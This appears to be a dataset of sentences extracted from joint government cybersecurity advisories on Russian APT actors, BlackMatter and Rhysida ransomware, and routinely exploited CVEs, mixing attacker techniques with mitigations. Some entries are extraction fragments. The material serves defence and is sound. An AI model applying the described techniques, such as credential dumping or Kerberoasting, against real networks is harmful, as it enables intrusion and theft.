CAND_00716,R015,5,R015_P0003,R015_S000077,"TLP:WHITE Tactic Technique Procedure Windows Command Shell [T1059.003] identify configuration settings, exfiltrate data, and to execute other commands."
CAND_00717,R015,5,R015_P0004,R015_S000079,Valid Accounts [T1078]
CAND_00718,R015,5,R015_P0008,R015_S000083,Russian state-sponsored APT actors have conducted brute- force password guessing and password spraying campaigns.
CAND_00719,R015,5,R015_P0008,R015_S000084,OS Credential Dumping: NTDS [T1003.003]
CAND_00720,R015,5,R015_P0010,R015_S000086,"Steal or Forge Kerberos Tickets: Kerberoasting [T1558.003] Russian state-sponsored APT actors have performed “Kerberoasting,” whereby they obtained the Ticket Granting Service (TGS) Tickets for Active Directory Service Principal Names (SPN) for offline cracking."
CAND_00721,R015,5,R015_P0012,R015_S000093,For information on ICS
CAND_00722,R015,6,R015_P0003,R015_S000095,"TLP:WHITE TTPs see the ATT&CK for ICS pages on the Sandworm Team, BlackEnergy 3 malware, CrashOveride malware, BlackEnergy’s KillDisk component, and NotPetya malware."
CAND_00723,R015,6,R015_P0003,R015_S000098,"Depending on the environment, examples include: o Native tools such as M365’s Sentinel."
CAND_00724,R015,7,R015_P0003,R015_S000117,INCIDENT RESPONSE Organizations detecting potential APT activity in their IT or OT networks should: 1.
CAND_00725,R015,7,R015_P0003,R015_S000119,2.
CAND_00726,R015,7,R015_P0003,R015_S000120,Secure backups.
CAND_00727,R015,7,R015_P0003,R015_S000126,"Consider soliciting support from a third-party IT organization to provide subject matter expertise, ensure the actor is eradicated from the network, and avoid residual issues that could enable follow-on exploitation."
CAND_00728,R015,7,R015_P0003,R015_S000132,"CISA, the FBI, and NSA encourage critical infrastructure owners and operators to see CISA’s Federal Government Cybersecurity Incident and Vulnerability Response Playbooks."
CAND_00729,R015,7,R015_P0003,R015_S000133,"Although tailored to federal civilian branch agencies, these playbooks provide operational procedures for planning and conducting cybersecurity incident and vulnerability response activities and detail each step for both incident and vulnerability response."
CAND_00730,R015,7,R015_P0003,R015_S000134,"Note: organizations should document incident response procedures in a cyber incident response plan, which organizations should create and exercise (as noted in the Mitigations section)."
CAND_00731,R015,8,R015_P0003,R015_S000140,Malicious cyber actors are known to target organizations on weekends and holidays when there are gaps in organizational cybersecurity—critical infrastructure organizations should proactively protect themselves by minimizing gaps in coverage.
CAND_00732,R015,8,R015_P0003,R015_S000150,"Regularly test contingency plans, such as manual controls, so that safety critical functions can be maintained during a cyber incident."
CAND_00733,R015,8,R015_P0003,R015_S000151,Ensure that the OT network can operate at necessary capacity even if the IT network is compromised.
CAND_00734,R015,8,R015_P0003,R015_S000152,o Regularly test manual controls so that critical functions can be kept running if ICS or OT networks need to be taken offline.
CAND_00735,R015,9,R015_P0002,R015_S000156,CISA | FBI | NSA TLP:WHITE Page 9 of 12 | Product ID: AA22-011A
CAND_00736,R015,9,R015_P0003,R015_S000160,"Identity and Access Management • Require multi-factor authentication for all users, without exception."
CAND_00737,R015,9,R015_P0003,R015_S000163,Russian state-sponsored APT actors have demonstrated their ability to maintain persistence using compromised credentials.
CAND_00738,R015,9,R015_P0003,R015_S000164,o Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored.
CAND_00739,R015,9,R015_P0003,R015_S000175,Administrator accounts should have the minimum permission they need to do their tasks.
CAND_00740,R015,10,R015_P0002,R015_S000181,CISA | FBI | NSA TLP:WHITE Page 10 of 12 | Product ID: AA22-011A
CAND_00741,R015,10,R015_P0003,R015_S000191,Define a demilitarized zone that eliminates unregulated communication between the IT and OT networks.
CAND_00742,R015,10,R015_P0003,R015_S000194,Prohibit ICS protocols from traversing the IT network.
CAND_00743,R015,10,R015_P0003,R015_S000195,"Vulnerability and Configuration Management • Update software, including operating systems, applications, and firmware on IT network assets, in a timely manner."
CAND_00744,R015,10,R015_P0003,R015_S000197,o Consider using a centralized patch management system.
CAND_00745,R015,11,R015_P0002,R015_S000207,CISA | FBI | NSA TLP:WHITE Page 11 of 12 | Product ID: AA22-011A
CAND_00746,R015,11,R015_P0003,R015_S000209,Monitor common ports and protocols for command and control activity.
CAND_00747,R015,11,R015_P0003,R015_S000211,• Ensure OT hardware is in read-only mode.
CAND_00748,R015,11,R015_P0003,R015_S000213,"Consider signing up for CISA notifications to receive timely information on current security issues, vulnerabilities, and high-impact activity."
CAND_00749,R015,11,R015_P0003,R015_S000220,"You may be eligible for a reward of up to $10 million, which DOS is offering for information leading to the identification or location of any person who, while acting under the direction or control of a foreign government, participates in malicious cyber activity against U.S."
CAND_00750,R015,12,R015_P0003,R015_S000225,TLP:WHITE CAVEATS The information you have accessed or received is being provided “as is” for informational purposes only.
CAND_00751,R016,1,R016_P0003,R016_S000002,"TLP:WHITE Co-Authored by: October 18, 2021 0"
CAND_00752,R016,1,R016_P0004,R016_S000006,cisa.gov/tlp/.
CAND_00753,R016,1,R016_P0005,R016_S000011,"This advisory provides information on cyber actor tactics, techniques, and procedures (TTPs) obtained from a sample of BlackMatter ransomware analyzed in a sandbox environment as well from trusted third-party reporting."
CAND_00754,R016,1,R016_P0005,R016_S000012,"Using embedded, previously compromised credentials, BlackMatter leverages the Lightweight Directory Access Protocol (LDAP) and Server Message Block (SMB) protocol to access the Active Directory (AD) to discover all hosts on the network."
CAND_00755,R016,1,R016_P0005,R016_S000013,BlackMatter then remotely encrypts the hosts and shared drives as they are found.
CAND_00756,R016,1,R016_P0005,R016_S000014,"Ransomware attacks against critical infrastructure entities could directly affect consumer access to critical infrastructure services; therefore, CISA, the FBI, and NSA urge all organizations, including critical infrastructure organizations, to implement the recommendations listed in the Mitigations section of this joint advisory."
CAND_00757,R016,1,R016_P0005,R016_S000017,"• Use strong, unique passwords."
CAND_00758,R016,1,R016_P0005,R016_S000018,• Use multi-factor authentication.
CAND_00759,R016,1,R016_P0005,R016_S000019,• Implement network segmentation and traversal monitoring.
CAND_00760,R016,1,R016_P0005,R016_S000020,"Victims of ransomware should report it immediately to CISA at a or When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact."
CAND_00761,R016,1,R016_P0005,R016_S000022,This document is marked TLP:WHITE.
CAND_00762,R016,2,R016_P0002,R016_S000029,"BlackMatter actors have attacked numerous U.S.-based organizations and have demanded ransom payments ranging from $80,000 to $15,000,000 in Bitcoin and Monero."
CAND_00763,R016,2,R016_P0002,R016_S000030,"Tactics, Techniques, and Procedures This advisory provides information on cyber actor TTPs obtained from the following sample of BlackMatter ransomware, which was analyzed in a sandbox environment, as well as from trusted third parties: SHA- 256: 706f3eec328e91ff7f66c8f0a2fb9b556325 c153a329a2062dc85879c540839d."
CAND_00764,R016,2,R016_P0002,R016_S000032,BlackMatter then uses the embedded credentials in the LDAP and SMB protocol to discover all hosts in the AD and the srvsvc.NetShareEnumAll Microsoft Remote Procedure Call (MSRPC) function to enumerate each host for accessible shares.
CAND_00765,R016,2,R016_P0002,R016_S000036,"Table 1 maps BlackMatter’s capabilities to the MITRE ATT&CK for Enterprise framework, based on the analyzed variant and trusted third-party reporting."
CAND_00766,R016,2,R016_P0002,R016_S000037,"Table 1: BlackMatter Actors and Ransomware TTPs Tactic Technique Procedure Persistence [TA0003] External Remote Services [T1133] BlackMatter leverages legitimate remote monitoring and management software and remote desktop software, often by setting up trial accounts, to maintain persistence on victim networks."
CAND_00767,R016,2,R016_P0002,R016_S000038,"This advisory uses the MITRE ATT&CK® framework, version 9."
CAND_00768,R016,2,R016_P0002,R016_S000039,See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
CAND_00769,R016,3,R016_P0002,R016_S000042,Process Discovery [T1057] BlackMatter uses NtQuerySystemInformation to enumerate running processes.
CAND_00770,R016,3,R016_P0002,R016_S000046,Impact [TA0040] Data Encrypted for Impact [T1486] BlackMatter remotely encrypts shares via SMB protocol and drops a ransomware note in each directory.
CAND_00771,R016,3,R016_P0002,R016_S000047,Disk Wipe [T1561] BlackMatter may wipe backup systems.
CAND_00772,R016,4,R016_P0002,R016_S000051,"These signatures will identify and block placement of the ransom note on the first share that is encrypted, subsequently blocking additional SMB traffic from the encryptor system for 24 hours."
CAND_00773,R016,4,R016_P0002,R016_S000052,"Use Strong Passwords • Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to have strong, unique passwords."
CAND_00774,R016,4,R016_P0002,R016_S000053,Passwords should not be reused across multiple accounts or stored on the system where an adversary may have access.
CAND_00775,R016,4,R016_P0002,R016_S000054,"Note: devices with local administrative accounts should implement a password policy that requires strong, unique passwords for each individual administrative account."
CAND_00776,R016,4,R016_P0002,R016_S000057,Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats.
CAND_00777,R016,4,R016_P0002,R016_S000058,"Limit Access to Resources over the Network • Remove unnecessary access to administrative shares, especially ADMIN$ and C$."
CAND_00778,R016,4,R016_P0002,R016_S000060,• Use a host-based firewall to only allow connections to administrative shares via SMB from a limited set of administrator machines.
CAND_00779,R016,4,R016_P0002,R016_S000061,Implement Network Segmentation and Traversal Monitoring Adversaries use system and network discovery techniques for network and system visibility and mapping.
CAND_00780,R016,5,R016_P0002,R016_S000065,"CISA | FBI | NSA Page 5 of 7 | Product ID: AA21-291A TLP: WHITE TLP:WHITE • Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool."
CAND_00781,R016,5,R016_P0002,R016_S000067,Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
CAND_00782,R016,5,R016_P0002,R016_S000068,"Use Admin Disabling Tools to Support Identity and Privileged Access Management If BlackMatter uses compromised credentials during non-business hours, the compromise may not be detected."
CAND_00783,R016,5,R016_P0002,R016_S000072,"When the account is needed, individual users submit their requests through an automated process that enables access to a system, but only for a set timeframe to support task completion."
CAND_00784,R016,5,R016_P0002,R016_S000074,Privilege escalation and lateral movement often depend on software utilities that run from the command line.
CAND_00785,R016,5,R016_P0002,R016_S000078,"• Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted) and covers the entire organization’s data infrastructure."
CAND_00786,R016,5,R016_P0002,R016_S000080,• Disable the storage of clear text passwords in LSASS memory.
CAND_00787,R016,5,R016_P0002,R016_S000081,• Consider disabling or limiting New Technology Local Area Network Manager (NTLM) and WDigest Authentication.
CAND_00788,R016,5,R016_P0002,R016_S000084,• Minimize the AD attack surface to reduce malicious ticket-granting activity.
CAND_00789,R016,5,R016_P0002,R016_S000085,Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ Ticket Granting service and can be used to obtain hashed credentials that attackers attempt to crack.
CAND_00790,R016,6,R016_P0002,R016_S000087,o Audit Domain Controllers to log successful Kerberos Ticket-Granting Service requests and ensure the events are monitored for anomalous activity.
CAND_00791,R016,6,R016_P0002,R016_S000089,"Note: critical infrastructure organizations with industrial control systems/operational technology networks should review joint CISA-FBI Cybersecurity Advisory AA21-131A: DarkSide Ransomware: Best Practices for Preventing Business Disruption from Ransomware Attacks for more mitigations, including mitigations to reduce the risk of severe business or functional degradation should their entity fall victim to a ransomware attack."
CAND_00792,R016,6,R016_P0002,R016_S000091,11 of the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
CAND_00793,R016,6,R016_P0002,R016_S000093,"If possible, scan backup data with an antivirus program to check that it is free of malware."
CAND_00794,R016,6,R016_P0002,R016_S000094,"• Reporting incidents immediately to the FBI at a local FBI Field Office, CISA at us- cert.cisa.gov/report, or the U.S."
CAND_00795,R016,6,R016_P0002,R016_S000096,Secret Service Field Office.
CAND_00796,R016,6,R016_P0002,R016_S000100,Paying the ransom also does not guarantee that a victim’s files will be recovered.
CAND_00797,R016,6,R016_P0002,R016_S000103,"• CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware."
CAND_00798,R016,6,R016_P0002,R016_S000104,"By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors."
CAND_00799,R016,7,R016_P0003,R016_S000107,"CISA, the FBI, and NSA do not endorse any commercial product or service, including any subjects of analysis."
CAND_00800,R016,7,R016_P0003,R016_S000108,"Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by CISA, the FBI, or NSA."
CAND_00801,R017,1,R017_P0002,R017_S000005,Australian organizations: Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories.
CAND_00802,R017,2,R017_P0002,R017_S000020,"o Prioritize secure-by-default configurations, such as eliminating default passwords, or requiring addition configuration changes to enhance product security."
CAND_00803,R017,2,R017_P0002,R017_S000022,• End-user organizations: o Apply timely patches to systems.
CAND_00804,R017,2,R017_P0002,R017_S000023,Note: First check for signs of compromise if CVEs identified in this CSA have not been patched.
CAND_00805,R017,2,R017_P0002,R017_S000029,Malicious cyber actors generally have the most success exploiting known vulnerabilities within the first two years of public disclosure—the value of such vulnerabilities gradually decreases as software is patched or upgraded.
CAND_00806,R017,3,R017_P0002,R017_S000037,"This vulnerability, affecting Fortinet SSL VPNs, was also routinely exploited in 2020 and 2021."
CAND_00807,R017,3,R017_P0002,R017_S000047,• CVE-2021-26084.
CAND_00808,R017,3,R017_P0002,R017_S000052,"This vulnerability, known as Log4Shell, affects Apache’s Log4j library, an open-source logging framework incorporated into thousands of products worldwide."
CAND_00809,R017,3,R017_P0002,R017_S000055,"The actor can then steal information, launch ransomware, or conduct other malicious activity.[1] Malicious cyber actors began exploiting the vulnerability after it was publicly disclosed in December 2021, and continued to show high interest in CVE-2021- 44228 through the first half of 2022."
CAND_00810,R017,3,R017_P0002,R017_S000056,"• CVE-2022-22954, CVE-2022-22960."
CAND_00811,R017,4,R017_P0002,R017_S000062,This vulnerability allows unauthenticated malicious cyber actors to bypass iControl REST authentication on F5 BIG-IP application delivery and security software.
CAND_00812,R017,4,R017_P0002,R017_S000065,"A remote, unauthenticated cyber actor could exploit this vulnerability to take control of an affected system."
CAND_00813,R017,5,R017_P0004,R017_S000072,CWE-400 Uncontrolled Resource Consumption
CAND_00814,R017,8,R017_P0002,R017_S000079,Page 8 of 26 | Product ID: AA23-215A UNCLASSIFIED / NON CLASSIFIÉ TLP:CLEAR TLP:CLEAR CVE Vendor Product Type CWE Statement ('Expression Language Injection') CVE-2022- 42475 Fortinet FortiOS Heap-based Buffer Overflow CWE-787: Out-of-bounds Write
CAND_00815,R017,8,R017_P0003,R017_S000080,CVE-2022- 24682 Zimbra Collaboration Suite ‘Cross-site Scripting’ CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') CVE-2022- 22536 SAP Internet Communication Manager (ICM) HTTP Request Smuggling CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') CVE-2022- 22963 VMware Tanzu Spring Cloud RCE CWE-94: Improper Control of Generation of Code ('Code Injection')
CAND_00816,R017,9,R017_P0002,R017_S000082,Page 9 of 26 | Product ID: AA23-215A UNCLASSIFIED / NON CLASSIFIÉ TLP:CLEAR TLP:CLEAR MITIGATIONS Vendors and Developers The authoring agencies recommend vendors and developers take the following steps to ensure their products are secure by design and default: • Identify repeatedly exploited classes of vulnerability.
CAND_00817,R017,9,R017_P0002,R017_S000083,Perform an analysis of both CVEs and known exploited vulnerabilities to understand which classes of vulnerability are identified more than others.
CAND_00818,R017,9,R017_P0002,R017_S000096,• Ensure published CVEs include the proper CWE field identifying the root cause of the vulnerability to enable industry-wide analysis of software security and design flaws.
CAND_00819,R017,10,R017_P0002,R017_S000099,These mitigations align with the cross-sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST).
CAND_00820,R017,10,R017_P0002,R017_S000105,"For patch information on CVEs identified in this CSA, refer to the appendix."
CAND_00821,R017,10,R017_P0002,R017_S000106,"o If a patch for a known exploited or critical vulnerability cannot be quickly applied, implement vendor-approved workarounds."
CAND_00822,R017,10,R017_P0002,R017_S000115,"Monitor, examine, and document any deviations from the initial secure baseline [CPG 2.O]."
CAND_00823,R017,11,R017_P0002,R017_S000117,Store copies off-network in physically secure locations and test regularly [CPG 2.R].
CAND_00824,R017,11,R017_P0002,R017_S000118,• Maintain an updated cybersecurity incident response plan that is tested at least annually and updated within a risk informed time frame to ensure its effectiveness [CPG 2.S].
CAND_00825,R017,11,R017_P0002,R017_S000122,"If MFA is unavailable, require employees engaging in remote work to use strong passwords [CPG 2.A, 2.B, 2.C, 2.D, 2.G]."
CAND_00826,R017,11,R017_P0002,R017_S000125,o Ensure software service accounts only provide necessary permissions (least privilege) to perform intended functions (using non-administrative privileges where feasible).
CAND_00827,R017,11,R017_P0002,R017_S000126,Note: See CISA’s Capacity Enhancement Guide – Implementing Strong Authentication and ACSC’s guidance on Implementing Multi-Factor Authentication for more information on authentication system hardening.
CAND_00828,R017,11,R017_P0002,R017_S000132,"Use private virtual local area networks [CPG 2.F, 2.X]."
CAND_00829,R017,12,R017_P0002,R017_S000134,Page 12 of 26 | Product ID: AA23-215A UNCLASSIFIED / NON CLASSIFIÉ TLP:CLEAR TLP:CLEAR • Continuously monitor the attack surface and investigate abnormal activity that may indicate cyber actor or malware lateral movement [CPG 2.T].
CAND_00830,R017,12,R017_P0002,R017_S000137,o Use web application firewalls to monitor and filter web traffic.
CAND_00831,R017,12,R017_P0002,R017_S000144,"• Ask your software providers to discuss their secure by design program and to provide links to information about how they are working to remove classes of vulnerabilities, and to set secure default settings."
CAND_00832,R017,12,R017_P0002,R017_S000145,"RESOURCES • For information on the top vulnerabilities routinely exploited in 2016 through 2019, 2020, and 2021, see: o Joint CSA Top 10 Routinely Exploited Vulnerabilities o Joint CSA Top Routinely Exploited Vulnerabilities o Joint CSA 2021 Top Routinely Exploited Vulnerabilities • See the appendix for additional partner resources on the vulnerabilities mentioned in this CSA."
CAND_00833,R017,12,R017_P0002,R017_S000146,• See ACSC’s Essential Eight mitigation strategies for additional mitigations.
CAND_00834,R017,13,R017_P0002,R017_S000151,"Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring."
CAND_00835,R017,13,R017_P0002,R017_S000152,"PURPOSE This document was developed by CISA, NSA, FBI, ACSC, CCCS, NCSC-NZ, CERT NZ, and NCSC- UK in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations."
CAND_00836,R017,15,R017_P0007,R017_S000166,"Joint CSA: APT Actors Chaining Vulnerabilities Against SLTT, Critical Infrastructure, and Elections Organizations"
CAND_00837,R017,16,R017_P0007,R017_S000174,Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity
CAND_00838,R017,17,R017_P0002,R017_S000176,`
CAND_00839,R017,18,R017_P0002,R017_S000181,`
CAND_00840,R017,18,R017_P0004,R017_S000183,"CVE- 2021- 20016 SonicWALL SSLVPN SMA100, Build Version 10.x Confirmed Zero-day vulnerability in the SonicWall SMA100 build version 10.x"
CAND_00841,R017,19,R017_P0005,R017_S000189,"ACSC Alert: Microsoft Exchange ProxyShell Targeting in Australia CVE- 2022- 26134 Atlassian Confluence Server and Data Center, versions: 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1 Confluence Security Advisory 2022-06-02 CISA Alert: CISA Adds One Known Exploited Vulnerability (CVE- 2022-26134) to Catalog"
CAND_00842,R017,19,R017_P0006,R017_S000190,"ACSC Alert: Remote code execution vulnerability present in Atlassian Confluence Server and Data Center CVE- 2021- 34473 Microsoft Exchange Server, Multiple Version Microsoft Exchange Server Remote Code Execution Vulnerability, CVE-2021- 34473 Joint CSA: Iranian Government- Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities in Furtherance of Malicious Activities CVE- 2021- 34523 Microsoft Microsoft Exchange Server 2013 Cumulative Update 23"
CAND_00843,R017,20,R017_P0004,R017_S000195,Jira Atlassian: Confluence Server Webwork OGNL injection - CVE-2021-26084 CISA Alert: Atlassian Releases Security Updates for Confluence Server and Data Center CVE- 2021- 40539 Zoho ManageEngineCorp.
CAND_00844,R017,21,R017_P0002,R017_S000200,`
CAND_00845,R017,21,R017_P0003,R017_S000201,Page 21 of 26 | Product ID: AA23-215A TLP:CLEAR TLP:CLEAR
CAND_00846,R017,21,R017_P0007,R017_S000206,ACSC Advisory: 2021-007: Log4j vulnerability – advice and mitigations
CAND_00847,R017,22,R017_P0002,R017_S000211,`
CAND_00848,R017,22,R017_P0005,R017_S000214,"CVE- 2022- 22954 VMware Workspace ONE Access, versions 21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0"
CAND_00849,R017,25,R017_P0003,R017_S000233,"Page 25 of 26 | Product ID: AA23-215A TLP:CLEAR TLP:CLEAR CVE- 2022- 30190 Microsoft Exchange Server, Multiple Versions"
CAND_00850,R017,25,R017_P0004,R017_S000234,"CISA Alert: Microsoft Releases Workaround Guidance for MSDT ""Follina"" Vulnerability CVE- 2022- 22047 Microsoft Multiple Products Windows Client Server Run- time Subsystem (CSRSS) Elevation of Privilege Vulnerability, CVE-2022- 22047"
CAND_00851,R018,1,R018_P0002,R018_S000003,SLTT organizations should report incidents to the MS-ISAC (866-787-4722 or SOC@cisecurity.org).
CAND_00852,R018,1,R018_P0002,R018_S000005,Disclosure is not limited.
CAND_00853,R018,1,R018_P0002,R018_S000008,"For more information on the Traffic Light Protocol, see cisa.gov/tlp TLP:CLEAR Product ID: AA23-319A November 15, 2023 Co-Authored by: TLP:CLEAR #StopRansomware: Rhysida Ransomware SUMMARY Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders detailing various ransomware variants and ransomware threat actors."
CAND_00854,R018,2,R018_P0002,R018_S000025,Initial Access Rhysida actors have been observed leveraging external-facing remote services to initially access and persist within a network.
CAND_00855,R018,2,R018_P0002,R018_S000026,"Remote services, such as virtual private networks (VPNs), allow users to connect to internal enterprise network resources from external locations."
CAND_00856,R018,2,R018_P0002,R018_S000028,"Additionally, actors have been observed exploiting Zerologon (CVE-2020-1472)—a critical elevation of privileges vulnerability in Microsoft’s Netlogon Remote Protocol [T1190]—as well as conducting successful phishing attempts [T1566]."
CAND_00857,R018,2,R018_P0002,R018_S000029,"Note: Microsoft released a patch for CVE-2020-1472 on August 11, 2020.[3] Living off the Land Analysis identified Rhysida actors using living off the land techniques, such as creating Remote Desktop Protocol (RDP) connections for lateral movement [T1021.001], establishing VPN access, and utilizing PowerShell [T1059.001]."
CAND_00858,R018,2,R018_P0002,R018_S000033,"In one instance of using compromised credentials, actors leveraged net commands within PowerShell to identify logged-in users and performed reconnaissance on network accounts within the victim environment."
CAND_00859,R018,3,R018_P0002,R018_S000038,"Note: The MFT resides within the New Technology File System (NTFS) and houses information about a file including its size, time and date stamps, permissions, and data content."
CAND_00860,R018,3,R018_P0002,R018_S000039,Leveraged Tools Table 1 lists legitimate tools Rhysida actors have repurposed for their operations.
CAND_00861,R018,3,R018_P0002,R018_S000044,PowerShell.exe A native command line tool used to start a Windows PowerShell session in a Command Prompt window.
CAND_00862,R018,3,R018_P0002,R018_S000045,PsExec.exe A tool included in the PsTools suite used to execute processes remotely.
CAND_00863,R018,3,R018_P0002,R018_S000050,PortStarter A back door script written in Go that provides functionality for modifying firewall settings and opening ports to pre-configured command and control (C2) servers.[1] secretsdump A script used to extract credentials and other confidential information from a system.
CAND_00864,R018,3,R018_P0002,R018_S000053,Rhysida actors used this tool to extract and dump the NTDS.dit database from the domain controller containing hashes for all Active Directory (AD) users.
CAND_00865,R018,4,R018_P0002,R018_S000056,The out folder contained various files listed in Table 2 below.
CAND_00866,R018,4,R018_P0002,R018_S000059,AnyDesk A common software that can be maliciously used by threat actors to obtain remote access and maintain persistence [T1219].
CAND_00867,R018,4,R018_P0002,R018_S000067,S_0.bat 1c4978cd5d750a2985da9b58db137fc74d 28422f1e087fd77642faa7efe7b597 A batch script likely used to place 1.ps1 on victim systems for ransomware staging purposes [T1059.003].
CAND_00868,R018,5,R018_P0002,R018_S000072,"Encryption After mapping the network, the ransomware encrypts data using a 4096-bit RSA encryption key with a ChaCha20 algorithm [T1486]."
CAND_00869,R018,6,R018_P0002,R018_S000081,FBI | CISA | MS-ISAC TLP:CLEAR Page 6 of 16 | Product ID: AA23-319A TLP:CLEAR
CAND_00870,R018,8,R018_P0002,R018_S000092,FBI | CISA | MS-ISAC TLP:CLEAR Page 8 of 16 | Product ID: AA23-319A TLP:CLEAR
CAND_00871,R018,9,R018_P0002,R018_S000100,Phishing T1566 Rhysida actors are known to conduct successful phishing attacks.
CAND_00872,R018,9,R018_P0002,R018_S000102,Command and Scripting Interpreter: Windows Command Shell T1059.003 Rhysida actors used batch scripting to place 1.ps1 on victim systems to automate ransomware execution.
CAND_00873,R018,10,R018_P0002,R018_S000103,FBI | CISA | MS-ISAC TLP:CLEAR Page 10 of 16 | Product ID: AA23-319A TLP:CLEAR Table 9: Privilege Escalation Technique Title ID Use Process Injection: Portable Executable Injection T1055.002 Rhysida actors injected a Windows 64-bit PE cryptographic ransomware application into running processes on compromised systems.
CAND_00874,R018,10,R018_P0002,R018_S000105,Indicator Removal: File Deletion T1070.004 Rhysida actors used PowerShell commands to delete binary strings.
CAND_00875,R018,10,R018_P0002,R018_S000107,"Table 11: Credential Access Technique Title ID Use OS Credential Dumping: NTDS T1003.003 Rhysida actors have been observed using secretsdump to extract credentials and other confidential information from a system, then dumping NTDS credentials."
CAND_00876,R018,11,R018_P0002,R018_S000114,Account Discovery: Domain Account T1087.002 Rhysida actors used the command net user [username] /domain to identify account information.
CAND_00877,R018,11,R018_P0002,R018_S000116,Table 13: Lateral Movement Technique Title ID Use Remote Services: Remote Desktop Protocol T1021.001 Rhysida actors are known to use RDP for lateral movement.
CAND_00878,R018,12,R018_P0002,R018_S000121,"MITIGATIONS FBI, CISA, and the MS-ISAC recommend that organizations implement the mitigations below to improve your organization’s cybersecurity posture."
CAND_00879,R018,12,R018_P0002,R018_S000127,"FBI, CISA, and the MS-ISAC recommend incorporating secure-by-design and -default principles, limiting the impact of ransomware techniques and strengthening overall security posture."
CAND_00880,R018,12,R018_P0002,R018_S000130,• Disable command-line and scripting activities and permissions.
CAND_00881,R018,12,R018_P0002,R018_S000131,Privilege escalation and lateral movement often depend on software utilities running from the command line.
CAND_00882,R018,12,R018_P0002,R018_S000132,"If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [CPG 2.N]."
CAND_00883,R018,12,R018_P0002,R018_S000136,• Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions.
CAND_00884,R018,13,R018_P0002,R018_S000139,"o PowerShell logs contain valuable data, including historical operating system and registry interaction and possible TTPs of a threat actor’s PowerShell use."
CAND_00885,R018,13,R018_P0002,R018_S000145,• Restrict the use of RDP and other remote desktop services to known user accounts and groups.
CAND_00886,R018,13,R018_P0002,R018_S000151,o Log RDP login attempts.
CAND_00887,R018,13,R018_P0002,R018_S000154,A properly configured application allowlisting solution will block any unlisted application execution.
CAND_00888,R018,13,R018_P0002,R018_S000159,Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].
CAND_00889,R018,13,R018_P0002,R018_S000164,Endpoint detection and response (EDR) tools are particularly useful for detecting
CAND_00890,R018,14,R018_P0002,R018_S000165,FBI | CISA | MS-ISAC TLP:CLEAR Page 14 of 16 | Product ID: AA23-319A TLP:CLEAR lateral connections as they have insight into common and uncommon network connections for each host [CPG 3.A].
CAND_00891,R018,14,R018_P0002,R018_S000166,• Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP) [CPG 2.E].
CAND_00892,R018,14,R018_P0002,R018_S000168,"For example, the just-in-time (JIT) access method provisions privileged access when needed and can support the enforcement of PoLP (as well as the zero trust model)."
CAND_00893,R018,14,R018_P0002,R018_S000169,This is a process where a network-wide policy is set in place to automatically disable admin accounts at the AD level when the account is not in direct need.
CAND_00894,R018,14,R018_P0002,R018_S000170,Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
CAND_00895,R018,14,R018_P0002,R018_S000179,"VALIDATE SECURITY CONTROLS In addition to applying mitigations, FBI, CISA, and the MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory."
CAND_00896,R018,14,R018_P0002,R018_S000183,2.
CAND_00897,R018,15,R018_P0002,R018_S000195,"Additional details requested include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host and network-based indicators."
CAND_00898,R018,15,R018_P0002,R018_S000196,FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered.
CAND_00899,R018,15,R018_P0002,R018_S000198,"Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to the FBI’s Internet Crime Complaint Center (IC3) at Ic3.gov, a local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or (888) 282-0870."
CAND_00900,R018,15,R018_P0002,R018_S000199,REFERENCES [1] Microsoft: DEV-0832 (Vice Society) Opportunistic Ransomware Campaigns Impacting US Education Sector [2] FortiGuard Labs: Ransomware Roundup - Rhysida [3] Microsoft: Security Update Guide - CVE-2020-1472 [4] Microsoft: Master File Table (Local File Systems) [5] SentinelOne: Rhysida [6] Secplicity: Scratching the Surface of Rhysida Ransomware
CAND_00901,R019,1,R019_P0002,R019_S000001,All organizations should report incidents and anomalous activity to CISA’s 24/7 Operations Center at report@cisa.gov or (888) 282-0870 and/or to the FBI via your local FBI field office.
